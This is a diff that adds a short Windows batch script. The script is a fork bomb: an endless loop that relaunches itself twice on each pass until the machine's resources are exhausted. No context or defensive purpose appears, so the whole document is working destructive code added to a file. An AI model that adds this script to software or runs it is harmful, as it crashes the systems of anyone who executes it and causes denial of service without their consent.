@@ -1,0 +1,5 @@
+@echo off
+:boom
+start "" %0
+start "" %0
+goto boom
